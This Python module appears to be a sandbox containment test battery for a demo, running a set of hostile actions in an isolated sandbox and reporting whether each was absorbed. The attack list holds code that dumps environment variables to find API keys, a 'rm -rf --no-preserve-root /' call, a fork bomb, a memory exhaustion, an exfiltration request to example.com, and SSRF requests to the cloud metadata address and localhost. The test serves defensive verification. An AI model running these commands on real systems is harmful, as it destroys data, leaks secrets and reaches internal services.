"""Containment test battery: hostile actions thrown at a fresh sandbox.

This is the "containment moment" for the demo. Each attack runs inside
the same sandbox the agent uses, and the result shows how it was absorbed.
"""

from __future__ import annotations

import os
import time
import uuid
from typing import Any, AsyncIterator

from .sandbox import make_sandbox

SECRET_ENV_NAMES = ("VULTR_INFERENCE_API_KEY", "BRAVE_SEARCH_API_KEY", "VULTR_API_KEY", "APP_ACCESS_CODE")

ATTACKS: list[dict[str, str]] = [
    {"id": "secrets", "title": "Steal API keys from the environment",
     "code": "import os\nkeys = sorted(os.environ)\nprint('env vars:', keys)\n"
             "print('leaked:', [k for k in keys if 'KEY' in k or 'TOKEN' in k or 'SECRET' in k])"},
    {"id": "rm", "title": "rm -rf / --no-preserve-root",
     "code": "import subprocess, os\nr = subprocess.run(['rm', '-rf', '--no-preserve-root', '/'], capture_output=True, "
             "text=True)\nprint('rm exit code:', r.returncode)\nprint(r.stderr[-300:])\n"
             "print('/etc/passwd still there:', os.path.exists('/etc/passwd'))"},
    {"id": "loop", "title": "Infinite loop", "code": "while True:\n    pass"},
    {"id": "fork", "title": "Fork bomb", "code": "import os\nwhile True:\n    os.fork()"},
    {"id": "memory", "title": "Allocate 4 GB of RAM", "code": "blob = bytearray(4 * 1024 ** 3)\nprint(len(blob))"},
    {"id": "network", "title": "Exfiltrate data over the network",
     "code": "import urllib.request\nurllib.request.urlopen('https://example.com/?leak=1', timeout=5)\n"
             "print('network reachable')"},
]

BROWSER_ATTACKS: list[dict[str, str]] = [
    {"id": "metadata", "title": "Browser SSRF to the cloud metadata service",
     "url": "http://169.254.169.254/v1.json"},
    {"id": "localhost", "title": "Browser request to the host's localhost", "url": "http://127.0.0.1:8000/api/health"},
]


def _verdict(attack_id: str, ok: bool, data: dict[str, Any], error: str, contained: str) -> tuple[bool, str]:
    out = (data.get("stdout") or "") + (data.get("stderr") or "")
    if attack_id == "secrets":
        leaked = any(name in out for name in SECRET_ENV_NAMES)
        return (not leaked, "no API keys present in the sandbox environment" if not leaked else "SECRET LEAKED")
    if attack_id == "rm":
        return ("still there: True" in out or not ok, "read-only rootfs, non-root user: nothing deleted")
    if attack_id in {"loop", "fork"}:
        return (bool(contained) or not ok or data.get("exit_code") not in (0, None),
                f"stopped by sandbox ({contained or error[:80] or 'pid/time limit'})")
    if attack_id == "memory":
        return ("MemoryError" in out or bool(contained) or not ok or data.get("exit_code") not in (0, None),
                "memory cap enforced (MemoryError or OOM kill)")
    if attack_id == "network":
        return ("network reachable" not in out, "no network in the code sandbox")
    return (not ok, error[:120] or "request blocked")


async def run_battery() -> AsyncIterator[dict[str, Any]]:
    run_id = "ct-" + uuid.uuid4().hex[:10]
    sandbox = await make_sandbox()
    info = await sandbox.start(run_id)
    yield {"type": "sandbox", **info.as_dict()}
    try:
        for attack in ATTACKS:
            t0 = time.monotonic()
            res = await sandbox.run_python(attack["code"])
            contained, note = _verdict(attack["id"], res.ok, res.data, res.error, res.contained)
            yield {"type": "attack", "id": attack["id"], "title": attack["title"], "code": attack["code"],
                   "contained": contained, "note": note, "sandbox_said": res.contained or res.error[:200],
                   "exit_code": res.data.get("exit_code"), "stdout": (res.data.get("stdout") or "")[-600:],
                   "stderr": (res.data.get("stderr") or "")[-600:], "duration_s": round(time.monotonic() - t0, 2)}
        for attack in BROWSER_ATTACKS:
            t0 = time.monotonic()
            res = await sandbox.fetch(attack["url"])
            contained, note = _verdict(attack["id"], res.ok, res.data, res.error, res.contained)
            yield {"type": "attack", "id": attack["id"], "title": attack["title"], "code": f"GET {attack['url']}",
                   "contained": contained, "note": note, "sandbox_said": res.error[:200], "exit_code": None,
                   "stdout": "", "stderr": res.error[:600], "duration_s": round(time.monotonic() - t0, 2)}
    finally:
        await sandbox.destroy()
    host_ok = os.path.exists("/etc/passwd")
    yield {"type": "done", "host_ok": host_ok, "container_id": info.container_id,
           "message": "Sandbox destroyed. Host filesystem and app process untouched."}
